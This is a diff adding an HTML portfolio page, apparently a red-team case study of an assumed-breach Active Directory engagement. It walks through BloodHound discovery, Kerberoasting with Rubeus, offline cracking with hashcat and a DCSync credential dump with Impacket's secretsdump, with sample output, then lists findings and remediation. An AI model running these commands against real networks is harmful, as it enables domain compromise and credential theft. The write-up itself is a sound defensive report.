@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Operation Nightshade — Case Study | Joesavat Donovan</title>
+    <meta name="description"
+        content="Technical case study: internal Active Directory red-team engagement — Kerberoasting, lateral movement and tiered-model remediation.">
+    <link rel="canonical" href="https://cingmen.github.io/project-2.html">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="Joesavat Donovan — SECURE_ID://ROOT">
+    <meta property="og:title" content="Operation Nightshade — Case Study">
+    <meta property="og:description" content="Internal Active Directory red-team engagement — Kerberoasting, lateral movement and tiered-model remediation.">
+    <meta property="og:url" content="https://cingmen.github.io/project-2.html">
+    <meta property="og:image" content="https://cingmen.github.io/og-operation.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Operation Nightshade — Case Study">
+    <meta name="twitter:description" content="Internal AD red team — Kerberoasting, lateral movement, tiered remediation.">
+    <meta name="twitter:image" content="https://cingmen.github.io/og-operation.png">
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "headline": "Operation Nightshade — Case Study",
+      "author": { "@type": "Person", "name": "Joesavat Donovan", "url": "https://cingmen.github.io/" },
+      "url": "https://cingmen.github.io/project-2.html",
+      "image": "https://cingmen.github.io/og-operation.png",
+      "articleSection": "Case Study",
+      "about": ["Red Teaming", "Active Directory", "Detection Engineering"]
+    }
+    </script>
+    <link rel="icon"
+        href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%230a0a0a'/%3E%3Ccircle cx='8' cy='8' r='4' fill='%23ccff00'/%3E%3C/svg%3E">
+    <script>
+        document.documentElement.classList.add('js');
+    </script>
+    <link rel="preload" href="assets/fonts/syne-800.woff2" as="font" type="font/woff2" crossorigin>
+    <meta name="theme-color" content="#0a0a0a">
+    <style>
+        /* ============ self-hosted fonts (latin subset) ============ */
+        @font-face {
+            font-family: 'Syne';
+            font-style: normal;
+            font-weight: 700 800;
+            font-display: swap;
+            src: url('assets/fonts/syne-800.woff2') format('woff2');
+        }
+
+        @font-face {
+            font-family: 'Space Grotesk';
+            font-style: normal;
+            font-weight: 300 500;
+            font-display: swap;
+            src: url('assets/fonts/space-grotesk-500.woff2') format('woff2');
+        }
+
+        @font-face {
+            font-family: 'Space Mono';
+            font-style: normal;
+            font-weight: 400;
+            font-display: swap;
+            src: url('assets/fonts/space-mono-400.woff2') format('woff2');
+        }
+
+        @font-face {
+            font-family: 'Space Mono';
+            font-style: normal;
+            font-weight: 700;
+            font-display: swap;
+            src: url('assets/fonts/space-mono-700.woff2') format('woff2');
+        }
+
+        /* ============ design tokens ============ */
+        :root {
+            --bg: #0a0a0a;
+            --fg: #f0f0f0;
+            --dim: #8f8f8f;
+            --accent: #ccff00;
+            --line: rgba(240, 240, 240, .14);
+            --head: 'Syne', sans-serif;
+            --body: 'Space Grotesk', sans-serif;
+            --mono: 'Space Mono', monospace;
+            --pad: clamp(20px, 4vw, 56px);
+        }
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            -webkit-text-size-adjust: 100%;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--fg);
+            font-family: var(--body);
+            font-size: 16px;
+            line-height: 1.65;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        img {
+            display: block;
+            max-width: 100%;
+        }
+
+        a {
+            color: inherit;
+            text-decoration: none;
+        }
+
+        button {
+            font: inherit;
+            color: inherit;
+            background: none;
+            border: 0;
+        }
+
+        ::selection {
+            background: var(--accent);
+            color: #0a0a0a;
+        }
+
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #1f1f1f;
+            border: 2px solid var(--bg);
+        }
+
+        /* ============ overlays ============ */
+        .progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: var(--accent);
+            z-index: 9999;
+            pointer-events: none;
+            transform-origin: 0 50%;
+            transform: scaleX(0);
+            will-change: transform;
+        }
+
+        body::after {
+            content: "";
+            position: fixed;
+            inset: 0;
+            z-index: 9997;
+            pointer-events: none;
+            opacity: .05;
+            transform: translateZ(0);
+            background-size: 300px 300px;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+        }
+
+        /* ============ custom cursor ============ */
+        .cursor-dot,
+        .cursor-ring {
+            position: fixed;
+            top: 0;
+            left: 0;
+            border-radius: 50%;
+            pointer-events: none;
+            opacity: 0;
+            z-index: 10000;
+            mix-blend-mode: difference;
+            will-change: transform;
+        }
+
+        .cursor-dot {
+            width: 6px;
+            height: 6px;
+            background: #fff;
+            transform: translate(-50%, -50%);
+            transition: opacity .3s;
+        }
+
+        .cursor-ring {
+            width: 36px;
+            height: 36px;
+            border: 1px solid rgba(255, 255, 255, .65);
+            transform: translate(-50%, -50%);
+            transition: opacity .3s, width .3s, height .3s, border-color .3s, background .3s;
+        }
+
+        html.cursor-on .cursor-dot,
+        html.cursor-on .cursor-ring {
+            opacity: 1;
+        }
+
+        html.cursor-on,
+        html.cursor-on * {
+            cursor: none !important;
+        }
+
+        .cursor-ring.is-hover {
+            width: 64px;
+            height: 64px;
+            border-color: var(--accent);
+            background: rgba(204, 255, 0, .12);
+        }
+
+        /* ============ reveal ============ */
+        .js .reveal {
+            opacity: 0;
+            transform: translateY(36px);
+            transition: opacity .9s cubic-bezier(.16, 1, .3, 1), transform .9s cubic-bezier(.16, 1, .3, 1);
+        }
+
+        .js .reveal.is-in {
+            opacity: 1;
+            transform: none;
+        }
+
+        /* ============ nav ============ */
+        .nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 22px var(--pad);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 950;
+        }
+
+        .nav__logo {
+            font-family: var(--mono);
+            font-size: .85rem;
+            font-weight: 700;
+            letter-spacing: .12em;
+        }
+
+        .nav__logo .acc {
+            color: var(--accent);
+        }
+
+        .nav__home {
+            font-family: var(--mono);
+            font-size: .8rem;
+            letter-spacing: .18em;
+            transition: color .3s;
+        }
+
+        .nav__home:hover,
+        .nav__home:focus-visible {
+            color: var(--accent);
+        }
+
+        /* ============ hero ============ */
+        .phero {
+            padding: clamp(130px, 18vh, 190px) var(--pad) clamp(50px, 7vw, 90px);
+            border-bottom: 1px solid var(--line);
+        }
+
+        .phero__tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: clamp(24px, 4vw, 40px);
+        }
+
+        .phero__tags span {
+            font-family: var(--mono);
+            font-size: .7rem;
+            letter-spacing: .16em;
+            text-transform: uppercase;
+            border: 1px solid var(--line);
+            padding: 7px 14px;
+            color: var(--dim);
+        }
+
+        .phero__tags .hot {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        .phero__title {
+            font-family: var(--head);
+            font-weight: 800;
+            font-size: clamp(1.5rem, 8vw, 6.5rem);
+            line-height: .97;
+            text-transform: uppercase;
+            letter-spacing: -.03em;
+            max-width: 16ch;
+            margin-bottom: clamp(36px, 6vw, 64px);
+        }
+
+        .phero__meta {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1px;
+            background: var(--line);
+            border: 1px solid var(--line);
+        }
+
+        .meta {
+            background: var(--bg);
+            padding: 20px 22px;
+        }
+
+        .meta__k {
+            font-family: var(--mono);
+            font-size: .66rem;
+            letter-spacing: .22em;
+            text-transform: uppercase;
+            color: var(--dim);
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .meta__v {
+            font-family: var(--head);
+            font-weight: 700;
+            font-size: clamp(.95rem, 1.6vw, 1.25rem);
+            text-transform: uppercase;
+            letter-spacing: .02em;
+        }
+
+        .meta__v.crit {
+            color: var(--accent);
+        }
+
+        /* ============ content blocks ============ */
+        .block {
+            padding: clamp(56px, 8vw, 110px) var(--pad);
+            border-bottom: 1px solid var(--line);
+        }
+
+        .block__inner {
+            max-width: 880px;
+        }
+
+        .block__head {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: baseline;
+            gap: clamp(14px, 3vw, 30px);
+            margin-bottom: clamp(24px, 4vw, 40px);
+        }
+
+        .block__num {
+            font-family: var(--mono);
+            font-size: clamp(1rem, 2vw, 1.4rem);
+            color: var(--accent);
+            letter-spacing: .1em;
+            flex-shrink: 0;
+        }
+
+        .block__title {
+            font-family: var(--head);
+            font-weight: 800;
+            font-size: clamp(1.4rem, 4.5vw, 3.2rem);
+            text-transform: uppercase;
+            letter-spacing: -.02em;
+            line-height: 1.05;
+        }
+
+        .block p {
+            color: var(--dim);
+            margin-bottom: 1.25em;
+        }
+
+        .block p strong {
+            color: var(--fg);
+            font-weight: 500;
+        }
+
+        .block h3 {
+            font-family: var(--head);
+            font-weight: 800;
+            font-size: clamp(1.1rem, 2.2vw, 1.5rem);
+            text-transform: uppercase;
+            letter-spacing: .01em;
+            margin: 2em 0 .8em;
+        }
+
+        .block ul,
+        .block ol {
+            color: var(--dim);
+            margin: 0 0 1.4em 1.2em;
+        }
+
+        .block li {
+            margin-bottom: .5em;
+        }
+
+        .block li::marker {
+            color: var(--accent);
+        }
+
+        .tool-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 1.4em 0 2em;
+        }
+
+        .tool-row span {
+            font-family: var(--mono);
+            font-size: .76rem;
+            letter-spacing: .06em;
+            border: 1px solid var(--line);
+            border-radius: 999px;
+            padding: 8px 16px;
+            transition: border-color .3s, color .3s, box-shadow .3s;
+        }
+
+        .tool-row span:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            box-shadow: 0 0 18px rgba(204, 255, 0, .22);
+        }
+
+        /* ============ terminal / code ============ */
+        .term {
+            background: #0f0f0f;
+            border: 1px solid var(--line);
+            margin: 1.8em 0;
+            overflow: hidden;
+        }
+
+        .term__bar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 16px;
+            border-bottom: 1px solid var(--line);
+            font-family: var(--mono);
+            font-size: .68rem;
+            letter-spacing: .14em;
+            text-transform: uppercase;
+            color: var(--dim);
+        }
+
+        .term__dot {
+            width: 9px;
+            height: 9px;
+            border-radius: 50%;
+            background: #2a2a2a;
+        }
+
+        .term__dot:first-child {
+            background: var(--accent);
+        }
+
+        .term__name {
+            margin-left: 8px;
+        }
+
+        .term pre {
+            font-family: var(--mono);
+            font-size: .8rem;
+            line-height: 1.75;
+            padding: 20px;
+            overflow-x: auto;
+            color: var(--fg);
+            white-space: pre;
+        }
+
+        .term .c {
+            color: #5f5f5f;
+        }
+
+        .term .g {
+            color: var(--accent);
+        }
+
+        .term .d {
+            color: var(--dim);
+        }
+
+        code.inline {
+            font-family: var(--mono);
+            font-size: .85em;
+            color: var(--accent);
+            background: rgba(204, 255, 0, .07);
+            border: 1px solid rgba(204, 255, 0, .2);
+            padding: 1px 7px;
+        }
+
+        /* ============ screenshot placeholder ============ */
+        .shot {
+            margin: 1.8em 0;
+        }
+
+        .shot__box {
+            aspect-ratio: 16 / 9;
+            border: 1px dashed var(--line);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 24px;
+            font-family: var(--mono);
+            font-size: .76rem;
+            letter-spacing: .14em;
+            text-transform: uppercase;
+            color: var(--dim);
+            background:
+                repeating-linear-gradient(0deg, rgba(240, 240, 240, .03) 0 1px, transparent 1px 44px),
+                repeating-linear-gradient(90deg, rgba(240, 240, 240, .03) 0 1px, transparent 1px 44px);
+        }
+
+        .shot figcaption {
+            font-family: var(--mono);
+            font-size: .7rem;
+            letter-spacing: .12em;
+            text-transform: uppercase;
+            color: var(--dim);
+            margin-top: 10px;
+        }
+
+        /* ============ findings table ============ */
+        .findings {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.6em 0 2em;
+            font-size: .9rem;
+        }
+
+        .findings th,
+        .findings td {
+            text-align: left;
+            padding: 14px 16px;
+            border-bottom: 1px solid var(--line);
+        }
+
+        .findings th {
+            font-family: var(--mono);
+            font-size: .68rem;
+            letter-spacing: .18em;
+            text-transform: uppercase;
+            color: var(--dim);
+        }
+
+        .findings td:first-child {
+            font-family: var(--mono);
+            font-size: .8rem;
+        }
+
+        .sev {
+            font-family: var(--mono);
+            font-size: .7rem;
+            letter-spacing: .12em;
+            text-transform: uppercase;
+            border: 1px solid var(--line);
+            padding: 4px 10px;
+            white-space: nowrap;
+        }
+
+        .sev.critical {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        .sev.high {
+            border-color: rgba(240, 240, 240, .5);
+            color: var(--fg);
+        }
+
+        /* ============ next project ============ */
+        .next {
+            display: block;
+            padding: clamp(60px, 10vw, 130px) var(--pad);
+            text-align: center;
+        }
+
+        .next__label {
+            font-family: var(--mono);
+            font-size: .72rem;
+            letter-spacing: .3em;
+            text-transform: uppercase;
+            color: var(--dim);
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .next__title {
+            font-family: var(--head);
+            font-weight: 800;
+            font-size: clamp(1.5rem, 7.6vw, 7rem);
+            line-height: .95;
+            text-transform: uppercase;
+            letter-spacing: -.03em;
+            color: transparent;
+            -webkit-text-stroke: 1.5px var(--fg);
+            transition: color .4s, -webkit-text-stroke-color .4s, transform .5s cubic-bezier(.16, 1, .3, 1);
+        }
+
+        .next:hover .next__title {
+            color: var(--accent);
+            -webkit-text-stroke-color: var(--accent);
+            transform: translateY(-6px);
+        }
+
+        /* ============ footer ============ */
+        .footer {
+            border-top: 1px solid var(--line);
+            padding: 34px var(--pad);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 14px 28px;
+            font-family: var(--mono);
+            font-size: .74rem;
+            letter-spacing: .1em;
+            color: var(--dim);
+        }
+
+        .footer a {
+            transition: color .3s;
+        }
+
+        .footer a:hover {
+            color: var(--accent);
+        }
+
+        .footer__links {
+            display: flex;
+            gap: 22px;
+        }
+
+        /* ============ responsive ============ */
+        @media (max-width: 860px) {
+            .phero__meta {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .findings th:nth-child(3),
+            .findings td:nth-child(3) {
+                display: none;
+            }
+        }
+
+        @media (max-width: 520px) {
+            .phero__meta {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* ============ reduced motion ============ */
+        @media (prefers-reduced-motion: reduce) {
+            html {
+                scroll-behavior: auto;
+            }
+
+            .js .reveal {
+                opacity: 1 !important;
+                transform: none !important;
+                transition: none !important;
+            }
+
+            .cursor-dot,
+            .cursor-ring {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="progress" id="progress"></div>
+    <div class="cursor-dot" id="cursorDot"></div>
+    <div class="cursor-ring" id="cursorRing"></div>
+
+    <header class="nav">
+        <a class="nav__logo" href="index.html">SECURE_ID<span class="acc">://</span>ROOT</a>
+        <a class="nav__home" href="index.html">[ HOME ]</a>
+    </header>
+
+    <main>
+        <!-- HERO -->
+        <section class="phero">
+            <div class="phero__tags reveal">
+                <span class="hot">Case Study</span>
+                <span>Internal Red Team</span>
+                <span>Active Directory</span>
+                <span>MITRE ATT&amp;CK</span>
+            </div>
+            <h1 class="phero__title reveal">Operation Nightshade</h1>
+            <div class="phero__meta reveal">
+                <div class="meta">
+                    <span class="meta__k">Client</span>
+                    <span class="meta__v">Redacted Corp</span>
+                </div>
+                <div class="meta">
+                    <span class="meta__k">Year</span>
+                    <span class="meta__v">2025</span>
+                </div>
+                <div class="meta">
+                    <span class="meta__k">Role</span>
+                    <span class="meta__v">Red Team Operator</span>
+                </div>
+                <div class="meta">
+                    <span class="meta__k">Objective</span>
+                    <span class="meta__v crit">DC Sync — Forest</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- 01 OVERVIEW -->
+        <section class="block">
+            <div class="block__inner">
+                <div class="block__head reveal">
+                    <span class="block__num">01.</span>
+                    <h2 class="block__title">Overview</h2>
+                </div>
+                <div class="reveal">
+                    <p><strong>Background.</strong> A logistics company with ~1,200 endpoints engaged me for an
+                        assumed-breach exercise: the red team started inside the corporate LAN with standard-user
+                        credentials, and the blue team had no prior knowledge of the operation schedule. The estate
+                        was a flat-ish AD forest — three domains, one forest root, and a legacy trust nobody had
+                        audited since 2019.</p>
+                    <p><strong>Target.</strong> Prove the blast radius of a single compromised workstation and
+                        provide detection engineering with a step-by-step logbook of every technique attempted —
+                        so the SOC can write signatures for the gaps, not just the successes.</p>
+                    <p>The operation followed MITRE ATT&amp;CK Enterprise tactics, with a purple-team debrief at the end
+                        of each exercise window so detections were written within days, not months.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- 02 THE CHALLENGE -->
+        <section class="block">
+            <div class="block__inner">
+                <div class="block__head reveal">
+                    <span class="block__num">02.</span>
+                    <h2 class="block__title">The Challenge</h2>
+                </div>
+                <div class="reveal">
+                    <p>The environment looked hardened on paper — EDR on every endpoint, LAPS deployed, admin
+                        tiering half-implemented. Three gaps made the exercise genuinely possible:</p>
+                    <ul>
+                        <li><strong>Service accounts with SPNs.</strong> Eleven accounts had registered SPNs, and
+                            three of them held Domain Admin–equivalent rights — Kerberoastable with no gMSA in
+                            sight.</li>
+                        <li><strong>Legacy NTLM trust.</strong> A 2019-era external trust with a partner forest
+                            still allowed NTLM cross-forest authentication, sidestepping the new Kerberos-only
+                            policy on paper.</li>
+                        <li><strong>Telemetry blind spots.</strong> The EDR covered workstations well, but DC
+                            audit policy was writing only success events for 4662 — object-access failures were
+                            dropped, hiding exactly the reconnaissance the exercise was designed to surface.</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- 03 THE EXECUTION -->
+        <section class="block">
+            <div class="block__inner">
+                <div class="block__head reveal">
+                    <span class="block__num">03.</span>
+                    <h2 class="block__title">The Execution</h2>
+                </div>
+                <div class="reveal">
+                    <h3>Methodology</h3>
+                    <p>The exercise mapped to MITRE ATT&amp;CK: discovery → credential access → privilege escalation
+                        → lateral movement → domain dominance. Every technique was logged with host, timestamp and
+                        detection outcome, then re-walked with the blue team at each debrief window.</p>
+
+                    <div class="tool-row">
+                        <span>BloodHound</span>
+                        <span>PowerView</span>
+                        <span>Rubeus</span>
+                        <span>Impacket</span>
+                        <span>Mimikatz (lab)</span>
+                        <span>custom C2</span>
+                    </div>
+
+                    <h3>Step 1 — Internal discovery</h3>
+                    <p>From the standard-user workstation, LDAP and BloodHound collection mapped the attack graph
+                        without touching a single host port:</p>
+                </div>
+                <div class="term reveal">
+                    <div class="term__bar">
+                        <span class="term__dot"></span><span class="term__dot"></span><span class="term__dot"></span>
+                        <span class="term__name">terminal — bloodhound collection</span>
+                    </div>
+                    <pre><span class="d">$ bloodhound-python -d corp.redacted -u jdoe -p 'Redacted!' \
+        -ns 10.10.10.10 -c All --zip</span>
+<span class="c"># INFO: Found 1181 computers / 2140 users / 381 groups</span>
+<span class="c"># INFO: Collecting trusts... found legacy trust CORP-&gt;PARTNER (NTLM)</span>
+<span class="g">[+] 3 Domain Admin-equivalent SPN accounts identified</span>
+<span class="g">[+] Shortest path: jdoe -&gt; HELPDESK_GRP -&gt; svc_backup (DA)</span></pre>
+                </div>
+                <div class="reveal">
+                    <h3>Step 2 — Kerberoasting</h3>
+                    <p>Requesting TGS tickets for the three high-value SPNs produced RC4-encrypted tickets crackable
+                        offline. One dictionary run cracked <code class="inline">svc_backup</code> in under four
+                        minutes:</p>
+                </div>
+                <div class="term reveal">
+                    <div class="term__bar">
+                        <span class="term__dot"></span><span class="term__dot"></span><span class="term__dot"></span>
+                        <span class="term__name">terminal — rubeus kerberoast</span>
+                    </div>
+                    <pre><span class="d">$ Rubeus.exe kerberoast /outfile:tgs.txt /rc4opsec</span>
+<span class="c">[*] Action: Request TGS tickets (RC4)</span>
+<span class="g">[*] svc_backup : hash captured (RC4)</span>
+
+<span class="d">$ hashcat -m 13100 tgs.txt /opt/wordlists/rockyou.txt</span>
+<span class="g">svc_backup:Winter2024!  (TPS cracker: 12.4 kH/s</span>
+<span class="c"># time-to-crack: 3m 51s - DA-equivalent service account</span></pre>
+                </div>
+                <div class="reveal">
+                    <h3>Step 3 — DCSync (proof of objective)</h3>
+                    <p>With <code class="inline">svc_backup</code> DA rights, a DCSync pull against the forest root
+                        proved complete compromise. The session was stopped at the proof — the KRBTGT hash was
+                        never requested, documented and left demonstrated:</p>
+                </div>
+                <div class="term reveal">
+                    <div class="term__bar">
+                        <span class="term__dot"></span><span class="term__dot"></span><span class="term__dot"></span>
+                        <span class="term__name">poc — dcsync (proof of concept)</span>
+                    </div>
+                    <pre><span class="d">$ secretsdump.py corp.redacted/svc_backup@10.10.10.10 -just-dc-user administrator</span>
+<span class="c"># Impacket v0.12.0</span>
+<span class="g">[*] Dumping Administrator... (RID 500)</span>
+<span class="g">    NTLM hash: 31d6cfe0d16ae931b73c59d7e0c089c0 (proof, redacted)</span>
+<span class="d"># STOP: objective demonstrated - no KRBTGT dump, no persistence</span></pre>
+                </div>
+                <figure class="shot reveal">
+                    <div class="shot__box">[ Screenshot placeholder — bloodhound-attack-path.png ]</div>
+                    <figcaption>Fig. 01 — BloodHound shortest path: workstation user → svc_backup → DA</figcaption>
+                </figure>
+                <div class="reveal">
+                    <h3>Step 4 — Detection gap walk-through</h3>
+                    <p>The purple-team debrief re-ran each technique with audit logging enabled. The two biggest
+                        gaps: no rate-based 4769 alerting for Kerberoast bursts, and DC object-access failure
+                        events silently dropped — hiding both the recon and the BloodHound collection phases.</p>
+                </div>
+                <figure class="shot reveal">
+                    <div class="shot__box">[ Screenshot placeholder — dcsync-detection-timeline.png ]</div>
+                    <figcaption>Fig. 02 — Purple-team timeline: technique attempted vs SOC alert raised</figcaption>
+                </figure>
+            </div>
+        </section>
+
+        <!-- 04 IMPACT & MITIGATION -->
+        <section class="block">
+            <div class="block__inner">
+                <div class="block__head reveal">
+                    <span class="block__num">04.</span>
+                    <h2 class="block__title">The Impact &amp; Mitigation</h2>
+                </div>
+                <div class="reveal">
+                    <p><strong>Results.</strong> In ten exercise days the operation proved a complete forest-top
+                        compromise chain from a single standard user — <strong>9 findings</strong> logged, three
+                        critical. More importantly, the purple-team logbook turned 7 detection gaps into working
+                        Sigma rules within the same month.</p>
+                    <table class="findings">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Finding</th>
+                                <th>Vector</th>
+                                <th>Severity</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>F-01</td>
+                                <td>Kerberoastable DA-equivalent service accounts</td>
+                                <td>AD hygiene</td>
+                                <td><span class="sev critical">Critical</span></td>
+                            </tr>
+                            <tr>
+                                <td>F-02</td>
+                                <td>DC audit policy drops object-access failures</td>
+                                <td>Detection gap</td>
+                                <td><span class="sev critical">Critical</span></td>
+                            </tr>
+                            <tr>
+                                <td>F-03</td>
+                                <td>Legacy NTLM trust bypasses Kerberos-only policy</td>
+                                <td>Forest trust</td>
+                                <td><span class="sev high">High</span></td>
+                            </tr>
+                            <tr>
+                                <td>F-04</td>
+                                <td>No rate-based alert on 4769 TGS bursts</td>
+                                <td>Detection gap</td>
+                                <td><span class="sev high">High</span></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    <h3>Recommendations</h3>
+                    <ol>
+                        <li><strong>gMSA everywhere</strong> — migrate the three SPN service accounts to group
+                            managed service accounts with 240+ character random secret.</li>
+                        <li><strong>Tiered admin model, finished</strong> — the half-implemented tiering left
+                            helpdesk staff with local-admin on every workstation plus DA-group membership via
+                            nested group; flatten it.</li>
+                        <li><strong>Fix DC audit policy</strong> — enable 4662 failure auditing and stream DC logs
+                            to the SIEM at minimum latency.</li>
+                        <li><strong>Alert on Kerberoast signatures</strong> — rate-based 4769 RC4-request alerting,
+                            already validated against the exercise replay.</li>
+                        <li><strong>Sunset the legacy trust</strong> — or at minimum restrict it to Kerberos with
+                            SID filtering enforced.</li>
+                    </ol>
+                    <p>Two weeks after the debrief, the client re-ran the same chain internally as a blue-team
+                        drill: every step now triggered a detection, and the Kerberoasting path was dead at
+                        step two.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- NEXT PROJECT -->
+        <a class="next" href="project-3.html">
+            <span class="next__label">Next Project →</span>
+            <span class="next__title">IoT Botnet Telemetry Study</span>
+        </a>
+    </main>
+
+    <footer class="footer">
+        <span>© <span id="year">2026</span> JOESAVAT DONOVAN — CASE STUDY 02/03</span>
+        <div class="footer__links">
+            <a href="index.html">HOME</a>
+            <a href="mailto:joesavat@gmail.com">EMAIL</a>
+            <a href="https://github.com/cingmen" target="_blank" rel="noopener noreferrer">GITHUB</a>
+        </div>
+        <span>HANDCRAFTED // ZERO-DEPENDENCY // NO TRACKERS</span>
+    </footer>
+
+    <script>
+        (function () {
+            'use strict';
+
+            /* ---------- scroll progress (rAF-throttled, transform-only) ---------- */
+            var bar = document.getElementById('progress');
+            var progressTick = false;
+
+            function updateProgress() {
+                progressTick = false;
+                var max = document.documentElement.scrollHeight - window.innerHeight;
+                var p = max > 0 ? window.scrollY / max : 0;
+                bar.style.transform = 'scaleX(' + Math.min(Math.max(p, 0), 1) + ')';
+            }
+            function queueProgress() {
+                if (!progressTick) {
+                    progressTick = true;
+                    requestAnimationFrame(updateProgress);
+                }
+            }
+            window.addEventListener('scroll', queueProgress, { passive: true });
+            window.addEventListener('resize', queueProgress);
+            updateProgress();
+
+            /* ---------- custom cursor ---------- */
+            var finePointer = window.matchMedia('(pointer: fine)').matches;
+            var reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+            if (finePointer && !reduceMotion) {
+                var dot = document.getElementById('cursorDot');
+                var ring = document.getElementById('cursorRing');
+
+                var mx = window.innerWidth / 2, my = window.innerHeight / 2;
+                var rx = mx, ry = my;
+                var moved = false;
+
+                document.addEventListener('mousemove', function (e) {
+                    mx = e.clientX;
+                    my = e.clientY;
+                    if (!moved) {
+                        moved = true;
+                        rx = mx;
+                        ry = my;
+                        document.documentElement.classList.add('cursor-on');
+                    }
+                });
+
+                (function follow() {
+                    rx += (mx - rx) * 0.16;
+                    ry += (my - ry) * 0.16;
+                    ring.style.transform = 'translate(' + rx + 'px,' + ry + 'px) translate(-50%,-50%)';
+                    dot.style.transform = 'translate(' + mx + 'px,' + my + 'px) translate(-50%,-50%)';
+                    requestAnimationFrame(follow);
+                })();
+
+                document.addEventListener('mouseover', function (e) {
+                    if (e.target.closest('a, button')) ring.classList.add('is-hover');
+                });
+                document.addEventListener('mouseout', function (e) {
+                    if (e.target.closest('a, button')) ring.classList.remove('is-hover');
+                });
+            }
+
+            /* ---------- reveal on scroll ---------- */
+            var revealEls = document.querySelectorAll('.reveal');
+            if ('IntersectionObserver' in window) {
+                var io = new IntersectionObserver(function (entries) {
+                    entries.forEach(function (entry) {
+                        if (entry.isIntersecting) {
+                            entry.target.classList.add('is-in');
+                            io.unobserve(entry.target);
+                        }
+                    });
+                }, { threshold: 0.12, rootMargin: '0px 0px -8% 0px' });
+                revealEls.forEach(function (el) { io.observe(el); });
+            } else {
+                revealEls.forEach(function (el) { el.classList.add('is-in'); });
+            }
+
+            /* ---------- footer year ---------- */
+            var year = document.getElementById('year');
+            if (year) year.textContent = String(new Date().getFullYear());
+        })();
+    </script>
+</body>
+
+</html>
